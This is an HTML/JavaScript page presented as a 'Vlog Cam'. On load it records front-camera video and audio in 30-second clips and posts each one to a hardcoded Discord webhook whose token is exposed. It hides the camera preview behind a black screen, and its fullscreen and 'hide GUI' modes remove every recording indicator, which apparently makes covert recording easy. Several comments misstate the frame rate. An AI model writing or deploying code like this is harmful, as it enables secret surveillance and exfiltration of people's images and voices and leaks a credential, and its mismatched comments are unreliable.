<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Vlog Cam</title>
    <style>
        /* ... (CSS is unchanged from your last version) ... */
        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: #000;
            color: #fff;
            font-family: system-ui, -apple-system, sans-serif;
            touch-action: manipulation;
            user-select: none;
            -webkit-user-select: none;
        }

        #video {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: 0;
        }

        #screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            z-index: 1;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: auto;
        }

        .ui-element {
            transition: opacity 0.3s ease, transform 0.2s ease;
            z-index: 2;
        }

        #dot {
            position: fixed;
            bottom: 80px;
            right: 24px;
            width: 14px;
            height: 14px;
            border-radius: 50%;
            background: #ff1744;
            box-shadow: 0 0 16px rgba(255, 23, 68, 0.7);
            opacity: 0.8;
            transition: opacity 0.3s;
            pointer-events: none;
        }
        #dot.paused {
            opacity: 0.2;
            background: #555;
            box-shadow: none;
        }

        #counter {
            position: fixed;
            bottom: 32px;
            right: 24px;
            font-size: 15px;
            font-weight: 400;
            color: rgba(255, 255, 255, 0.35);
            letter-spacing: 0.3px;
            pointer-events: none;
            font-variant-numeric: tabular-nums;
            background: rgba(0, 0, 0, 0.5);
            padding: 6px 14px;
            border-radius: 20px;
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            transition: opacity 0.3s;
        }

        #timer {
            position: fixed;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 2;
            font-size: 22px;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.6);
            background: rgba(0, 0, 0, 0.5);
            padding: 6px 20px;
            border-radius: 30px;
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            font-variant-numeric: tabular-nums;
            letter-spacing: 1px;
            pointer-events: none;
            transition: opacity 0.3s;
            min-width: 80px;
            text-align: center;
        }

        .ctrl-btn {
            position: fixed;
            left: 20px;
            z-index: 1000;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.15);
            color: rgba(255, 255, 255, 0.7);
            font-size: 26px;
            line-height: 1;
            padding: 14px 18px;
            border-radius: 40px;
            backdrop-filter: blur(6px);
            -webkit-backdrop-filter: blur(6px);
            cursor: pointer;
            pointer-events: auto;
            transition: background 0.2s, transform 0.2s, opacity 0.3s;
            user-select: none;
            -webkit-user-select: none;
            touch-action: manipulation;
            min-width: 60px;
            text-align: center;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.5);
        }
        .ctrl-btn:hover {
            background: rgba(255, 255, 255, 0.15);
        }
        .ctrl-btn:active {
            transform: scale(0.90);
        }

        #hide-gui-btn {
            bottom: 100px;
        }

        #fs-btn {
            bottom: 28px;
        }

        #status {
            position: fixed;
            top: 24px;
            left: 0;
            width: 100%;
            text-align: center;
            font-size: 14px;
            font-weight: 400;
            color: rgba(255, 255, 255, 0.15);
            z-index: 2;
            pointer-events: none;
            font-variant-numeric: tabular-nums;
            letter-spacing: 0.3px;
            padding: 0 20px;
            transition: opacity 0.8s;
        }
        #status.error {
            color: rgba(255, 70, 70, 0.6);
            font-weight: 500;
        }

        .fullscreen-ui #dot,
        .fullscreen-ui #counter,
        .fullscreen-ui #timer,
        .fullscreen-ui #fs-btn,
        .fullscreen-ui #hide-gui-btn,
        .fullscreen-ui #status {
            opacity: 0 !important;
            pointer-events: none !important;
            transition: opacity 0.4s;
        }

        body.gui-hidden #dot,
        body.gui-hidden #counter,
        body.gui-hidden #timer {
            opacity: 0 !important;
            pointer-events: none !important;
            transition: opacity 0.3s;
        }
        body.gui-hidden #hide-gui-btn,
        body.gui-hidden #fs-btn {
            opacity: 1 !important;
            pointer-events: auto !important;
        }

        #screen:-webkit-full-screen {
            background: #000;
        }
        #screen:fullscreen {
            background: #000;
        }

        ::selection {
            background: transparent;
        }
        ::-moz-selection {
            background: transparent;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>
    <div id="screen" role="button" aria-label="Toggle fullscreen"></div>

    <div id="dot" class="paused ui-element"></div>
    <div id="counter" class="ui-element">◉ 0 clips sent</div>
    <div id="timer" class="ui-element">00:30</div>
    <button id="hide-gui-btn" class="ctrl-btn ui-element" aria-label="Hide GUI">👁</button>
    <button id="fs-btn" class="ctrl-btn ui-element" aria-label="Toggle fullscreen">⛶</button>
    <div id="status" class="ui-element">● ready</div>

    <script>
        (function() {
            'use strict';

            // ─── CONFIG ────────────────────────────────────────────────
            const WEBHOOK = 'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';

            const CLIP_DURATION_MS = 30000; // 30 seconds
            
            // --- FIX 1: HIGH BITRATE (50 Mbps) ---
            const BITRATE = 50000000; // 50 Mbps for crisp 60fps video[reference:2]
            const FPS_IDEAL = 5; // --- FIX 2: Explicitly set to 5 FPS ---

            // --- FIX 3: Prioritize modern, efficient codecs ---
            const MIME_TYPES = [
                'video/webm;codecs=vp09', // VP9 is best for high-quality WebM
                'video/webm;codecs=vp9',
                'video/webm;codecs=vp8',
                'video/webm;codecs=h264',
                'video/webm'
            ];

            // ─── DOM REFS ──────────────────────────────────────────────
            const videoEl = document.getElementById('video');
            const screenEl = document.getElementById('screen');
            const dotEl = document.getElementById('dot');
            const counterEl = document.getElementById('counter');
            const timerEl = document.getElementById('timer');
            const statusEl = document.getElementById('status');
            const fsBtn = document.getElementById('fs-btn');
            const hideGuiBtn = document.getElementById('hide-gui-btn');

            // ─── STATE ─────────────────────────────────────────────────
            let stream = null;
            let recorder = null;
            let chunks = [];
            let clipCounter = 0;
            let isRecording = false;
            let isPaused = false;
            let clipTimer = null;
            let clipRemainingSeconds = 30;
            let timerInterval = null;

            // ─── HELPERS ───────────────────────────────────────────────

            function setStatus(msg, isError = false) {
                statusEl.textContent = msg;
                statusEl.className = isError ? 'error' : '';
                if (!isError) {
                    clearTimeout(statusEl._fadeTimer);
                    statusEl.style.opacity = '1';
                    statusEl._fadeTimer = setTimeout(() => {
                        statusEl.style.opacity = '0.2';
                    }, 6000);
                } else {
                    statusEl.style.opacity = '1';
                }
            }

            function updateCounter() {
                counterEl.textContent = `◉ ${clipCounter} clip${clipCounter !== 1 ? 's' : ''} sent`;
                counterEl.style.transition = 'transform 0.15s, color 0.3s';
                counterEl.style.transform = 'scale(1.08)';
                counterEl.style.color = 'rgba(255,255,255,0.6)';
                setTimeout(() => {
                    counterEl.style.transform = 'scale(1)';
                    counterEl.style.color = 'rgba(255,255,255,0.35)';
                }, 200);
            }

            function setDot(active) {
                if (active) {
                    dotEl.classList.remove('paused');
                } else {
                    dotEl.classList.add('paused');
                }
            }

            function updateTimerDisplay() {
                const mins = Math.floor(clipRemainingSeconds / 60);
                const secs = clipRemainingSeconds % 60;
                timerEl.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
            }

            function startTimer() {
                if (timerInterval) {
                    clearInterval(timerInterval);
                    timerInterval = null;
                }
                clipRemainingSeconds = 30;
                updateTimerDisplay();
                timerInterval = setInterval(() => {
                    clipRemainingSeconds--;
                    updateTimerDisplay();
                    if (clipRemainingSeconds <= 0) {
                        // timer will be reset by scheduleNextClip
                    }
                }, 1000);
            }

            function stopTimer() {
                if (timerInterval) {
                    clearInterval(timerInterval);
                    timerInterval = null;
                }
            }

            function showError(msg) {
                console.error('[VlogCam]', msg);
                setStatus('⚠ ' + msg, true);
                isPaused = true;
                setDot(false);
                stopTimer();
            }

            function clearError() {
                isPaused = false;
                setStatus('● recording', false);
                setDot(true);
                startTimer();
            }

            // ─── FULLSCREEN TOGGLE ────────────────────────────────────

            function toggleFullscreen() {
                try {
                    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                        const el = document.documentElement;
                        if (el.requestFullscreen) {
                            el.requestFullscreen().catch(() => {});
                        } else if (el.webkitRequestFullscreen) {
                            el.webkitRequestFullscreen();
                        } else if (el.msRequestFullscreen) {
                            el.msRequestFullscreen();
                        }
                    } else {
                        if (document.exitFullscreen) {
                            document.exitFullscreen().catch(() => {});
                        } else if (document.webkitExitFullscreen) {
                            document.webkitExitFullscreen();
                        } else if (document.msExitFullscreen) {
                            document.msExitFullscreen();
                        }
                    }
                } catch (_) { /* ignore */ }
            }

            fsBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                toggleFullscreen();
            });
            fsBtn.addEventListener('touchstart', (e) => {
                e.stopPropagation();
                toggleFullscreen();
            }, { passive: true });

            hideGuiBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                document.body.classList.toggle('gui-hidden');
                if (document.body.classList.contains('gui-hidden')) {
                    hideGuiBtn.textContent = '⊘';
                    hideGuiBtn.setAttribute('aria-label', 'Show GUI');
                } else {
                    hideGuiBtn.textContent = '👁';
                    hideGuiBtn.setAttribute('aria-label', 'Hide GUI');
                }
            });
            hideGuiBtn.addEventListener('touchstart', (e) => {
                e.stopPropagation();
                hideGuiBtn.click();
            }, { passive: true });

            screenEl.addEventListener('click', (e) => {
                if (e.target === screenEl) {
                    toggleFullscreen();
                }
            });
            screenEl.addEventListener('touchstart', (e) => {
                if (e.touches.length === 1 && e.target === screenEl) {
                    e.preventDefault();
                    toggleFullscreen();
                }
            }, { passive: false });

            // ─── FULLSCREEN UI HIDE ───────────────────────────────────

            function handleFullscreenChange() {
                if (document.fullscreenElement || document.webkitFullscreenElement) {
                    document.body.classList.add('fullscreen-ui');
                } else {
                    document.body.classList.remove('fullscreen-ui');
                }
            }

            document.addEventListener('fullscreenchange', handleFullscreenChange);
            document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
            document.addEventListener('mozfullscreenchange', handleFullscreenChange);
            document.addEventListener('MSFullscreenChange', handleFullscreenChange);

            // ─── CAMERA / RECORDING ───────────────────────────────────

            async function getCameraStream() {
                const constraints = {
                    video: {
                        facingMode: 'user',
                        width: { ideal: 3840 },
                        height: { ideal: 2160 },
                        // --- FIX 2: Explicitly set 60fps ---
                        frameRate: { ideal: FPS_IDEAL }
                    },
                    audio: {
                        echoCancellation: false,
                        noiseSuppression: false,
                        autoGainControl: false
                    }
                };

                try {
                    const s = await navigator.mediaDevices.getUserMedia(constraints);
                    const track = s.getVideoTracks()[0];
                    if (track) {
                        const settings = track.getSettings();
                        console.log('[VlogCam] camera:', {
                            label: track.label,
                            facingMode: settings.facingMode,
                            width: settings.width,
                            height: settings.height,
                            frameRate: settings.frameRate
                        });
                        if (settings.facingMode !== 'user') {
                            console.warn('[VlogCam] warning: facingMode is', settings.facingMode, 'not "user"');
                        }
                    }
                    return s;
                } catch (err) {
                    console.error('[VlogCam] getUserMedia failed:', err);
                    // Fallback to 1080p if 4K fails
                    try {
                        const fallbackConstraints = {
                            video: {
                                facingMode: 'user',
                                width: { ideal: 1920 },
                                height: { ideal: 1080 },
                                frameRate: { ideal: FPS_IDEAL }
                            },
                            audio: true
                        };
                        const s2 = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
                        console.warn('[VlogCam] using fallback 1080p constraints');
                        return s2;
                    } catch (err2) {
                        throw new Error('Camera unavailable: ' + (err2.message || err2.name));
                    }
                }
            }

            function getSupportedMimeType() {
                for (const mt of MIME_TYPES) {
                    if (MediaRecorder.isTypeSupported(mt)) {
                        return mt;
                    }
                }
                return null;
            }

            function startRecorder(mediaStream) {
                chunks = [];

                const mimeType = getSupportedMimeType();
                const options = {
                    mimeType: mimeType || undefined,
                    // --- FIX 1: High Bitrate ---
                    videoBitsPerSecond: BITRATE,
                    audioBitsPerSecond: 256000, // Higher audio bitrate for better quality
                    // --- FIX 4: Try to use constant bitrate mode (experimental) ---
                    // @ts-ignore - bitrateMode is not yet standard but supported in some browsers
                    bitrateMode: "constant"
                };

                try {
                    const rec = new MediaRecorder(mediaStream, options);
                    rec.ondataavailable = (e) => {
                        if (e.data && e.data.size > 0) {
                            chunks.push(e.data);
                        }
                    };

                    rec.onstop = () => {
                        if (chunks.length === 0) {
                            console.warn('[VlogCam] no data in clip, skipping upload');
                            scheduleNextClip();
                            return;
                        }

                        const blob = new Blob(chunks, {
                            type: mimeType || 'video/webm'
                        });
                        console.log('[VlogCam] clip ready:', {
                            size: (blob.size / 1024 / 1024).toFixed(2) + ' MB',
                            type: blob.type,
                            clip: clipCounter + 1
                        });

                        uploadToDiscord(blob)
                            .finally(() => {
                                chunks = [];
                                scheduleNextClip();
                            });
                    };

                    rec.onerror = (e) => {
                        console.error('[VlogCam] MediaRecorder error:', e);
                        showError('Recording error – restarting');
                        chunks = [];
                        setTimeout(() => {
                            if (stream) {
                                try {
                                    recorder = null;
                                    startRecorder(stream);
                                } catch (_) {
                                    restartCamera();
                                }
                            } else {
                                restartCamera();
                            }
                        }, 2000);
                    };

                    rec.start(1000);
                    return rec;
                } catch (err) {
                    console.error('[VlogCam] MediaRecorder init failed:', err);
                    throw new Error('Cannot start recording: ' + err.message);
                }
            }

            function scheduleNextClip() {
                if (clipTimer) {
                    clearTimeout(clipTimer);
                    clipTimer = null;
                }

                if (!stream || !isRecording) return;

                clipTimer = setTimeout(() => {
                    clipTimer = null;
                    if (stream && isRecording) {
                        try {
                            startTimer();
                            recorder = startRecorder(stream);
                            const stopTimer = setTimeout(() => {
                                if (recorder && recorder.state === 'recording') {
                                    try { recorder.stop(); } catch (_) {}
                                }
                            }, CLIP_DURATION_MS);
                            recorder._stopTimer = stopTimer;
                        } catch (err) {
                            console.error('[VlogCam] failed to start recorder:', err);
                            showError('Recorder failed – retrying...');
                            setTimeout(() => {
                                if (stream) {
                                    try {
                                        recorder = startRecorder(stream);
                                        clearError();
                                    } catch (_) {
                                        restartCamera();
                                    }
                                } else {
                                    restartCamera();
                                }
                            }, 3000);
                        }
                    }
                }, 300);
            }

            // ─── UPLOAD ────────────────────────────────────────────────

            async function uploadToDiscord(blob) {
                const filename = `clip_${String(++clipCounter).padStart(4, '0')}.webm`;

                const formData = new FormData();
                formData.append('file', blob, filename);

                const now = new Date();
                const timestamp = now.toISOString().replace('T', ' ').substring(0, 19);
                formData.append('content', `🎥 Clip #${clipCounter} · ${timestamp}`);

                try {
                    setStatus(`⬆ uploading #${clipCounter}...`, false);

                    const response = await fetch(WEBHOOK, {
                        method: 'POST',
                        body: formData
                    });

                    if (!response.ok) {
                        const text = await response.text().catch(() => '');
                        throw new Error(`Discord ${response.status}: ${text.substring(0, 100)}`);
                    }

                    console.log('[VlogCam] uploaded clip #' + clipCounter);
                    setStatus(`✓ clip #${clipCounter} sent`, false);
                    updateCounter();

                } catch (err) {
                    console.error('[VlogCam] upload failed:', err);
                    setStatus(`✗ upload #${clipCounter} failed`, true);
                    clipCounter--;
                    throw err;
                }
            }

            // ─── RESTART / RECOVERY ────────────────────────────────────

            async function restartCamera() {
                console.log('[VlogCam] restarting camera...');
                setStatus('reconnecting...', false);
                isRecording = false;
                setDot(false);
                stopTimer();

                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }
                if (recorder) {
                    try { recorder.stop(); } catch (_) {}
                    recorder = null;
                }
                if (clipTimer) {
                    clearTimeout(clipTimer);
                    clipTimer = null;
                }
                chunks = [];

                try {
                    stream = await getCameraStream();
                    videoEl.srcObject = stream;
                    await videoEl.play().catch(() => {});

                    isRecording = true;
                    clearError();

                    recorder = startRecorder(stream);
                    const stopTimer = setTimeout(() => {
                        if (recorder && recorder.state === 'recording') {
                            try { recorder.stop(); } catch (_) {}
                        }
                    }, CLIP_DURATION_MS);
                    recorder._stopTimer = stopTimer;

                    console.log('[VlogCam] recording started');
                } catch (err) {
                    showError('Camera error: ' + err.message);
                    setTimeout(() => {
                        if (!isRecording) {
                            restartCamera();
                        }
                    }, 5000);
                }
            }

            // ─── WAKE LOCK ─────────────────────────────────────────────

            let wakeLock = null;

            async function requestWakeLock() {
                try {
                    if ('wakeLock' in navigator) {
                        wakeLock = await navigator.wakeLock.request('screen');
                        wakeLock.addEventListener('release', () => {
                            console.log('[VlogCam] wake lock released');
                        });
                        console.log('[VlogCam] wake lock active');
                    }
                } catch (err) {
                    console.warn('[VlogCam] wake lock not available:', err);
                }
            }

            document.addEventListener('visibilitychange', () => {
                if (document.visibilityState === 'visible' && isRecording) {
                    requestWakeLock().catch(() => {});
                }
            });

            // ─── INIT ──────────────────────────────────────────────────

            async function init() {
                try {
                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                        throw new Error('MediaDevices API not supported');
                    }
                    if (typeof MediaRecorder === 'undefined') {
                        throw new Error('MediaRecorder not supported');
                    }

                    setStatus('starting camera...', false);

                    stream = await getCameraStream();
                    videoEl.srcObject = stream;
                    await videoEl.play().catch(() => {});

                    await requestWakeLock().catch(() => {});

                    isRecording = true;
                    clearError();

                    recorder = startRecorder(stream);
                    const stopTimer = setTimeout(() => {
                        if (recorder && recorder.state === 'recording') {
                            try { recorder.stop(); } catch (_) {}
                        }
                    }, CLIP_DURATION_MS);
                    recorder._stopTimer = stopTimer;

                    console.log('[VlogCam] ready, recording 4K 60fps from front camera');
                    setStatus('● recording', false);

                } catch (err) {
                    showError(err.message || 'init failed');
                    setTimeout(() => {
                        if (!isRecording) {
                            init();
                        }
                    }, 5000);
                }
            }

            // ─── CLEANUP ───────────────────────────────────────────────

            window.addEventListener('beforeunload', () => {
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                }
                if (recorder) {
                    try { recorder.stop(); } catch (_) {}
                }
                if (clipTimer) {
                    clearTimeout(clipTimer);
                }
                if (wakeLock) {
                    try { wakeLock.release(); } catch (_) {}
                }
                stopTimer();
            });

            // ─── GO ────────────────────────────────────────────────────

            setTimeout(init, 300);

            window.__vlog = {
                getState: () => ({
                    isRecording,
                    isPaused,
                    clipCounter,
                    chunks: chunks.length,
                    stream: !!stream,
                    recorder: !!recorder
                })
            };

        })();
    </script>

</body>
</html>
